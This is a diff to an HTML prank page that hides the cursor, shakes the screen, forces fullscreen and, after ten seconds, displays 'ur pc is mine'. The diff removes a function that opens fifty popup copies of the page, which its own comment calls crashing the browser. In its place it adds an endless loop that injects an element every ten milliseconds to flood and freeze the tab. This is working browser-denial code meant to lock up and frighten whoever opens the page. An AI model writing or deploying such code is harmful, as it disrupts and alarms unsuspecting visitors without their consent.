@@ -24,7 +24,7 @@
       justify-content: center;
       align-items: center;
       position: relative;
-      cursor: none; /* hide cursor */
+      cursor: none;
       animation: shake 0.2s infinite;
     }
 
@@ -103,10 +103,10 @@
   </div>
 
   <script>
-    // emoji rain
     const EMOJI = '😂';
     const COUNT = 50;
 
+    // Initial emoji rain
     for (let i = 0; i < COUNT; i++) {
       const emoji = document.createElement('div');
       emoji.className = 'emoji';
@@ -117,7 +117,7 @@
       document.body.appendChild(emoji);
     }
 
-    // try to auto fullscreen (only works if user interacts)
+    // Try to auto fullscreen (doesn't always work)
     document.addEventListener("DOMContentLoaded", () => {
       setTimeout(() => {
         if (document.documentElement.requestFullscreen) {
@@ -126,25 +126,29 @@
       }, 500);
     });
 
-    // fallback: fullscreen on click
+    // Fallback: click to fullscreen
     document.body.addEventListener("click", () => {
       if (document.fullscreenElement) return;
       document.documentElement.requestFullscreen().catch(console.warn);
     });
 
-    // --- NEW CODE: CRASH THE BROWSER AFTER 10 SECONDS ---
+    // 🔥 Chaos mode after 10 seconds
     setTimeout(() => {
       document.querySelector('.bounce-text').textContent = 'bye bye 👋';
       document.querySelector('.left').textContent = 'ur pc';
       document.querySelector('.right').textContent = 'is mine';
-    
-      function crashAndBurn() {
-        for (let i = 0; i < 50; i++) {
-          window.open(self.location.href, '_blank', 'height=181,width=666,left=3,top=222');
-        }
-      }
-    
-      crashAndBurn(); // trigger mass popups
+
+      // DOM flood — emoji spam every 10ms
+      setInterval(() => {
+        const spam = document.createElement('div');
+        spam.textContent = EMOJI;
+        spam.style.position = 'absolute';
+        spam.style.left = `${Math.random() * 100}vw`;
+        spam.style.top = `${Math.random() * 100}vh`;
+        spam.style.fontSize = `${1 + Math.random() * 3}rem`;
+        spam.style.pointerEvents = 'none';
+        document.body.appendChild(spam);
+      }, 10);
     }, 10000);
   </script>
 </body>
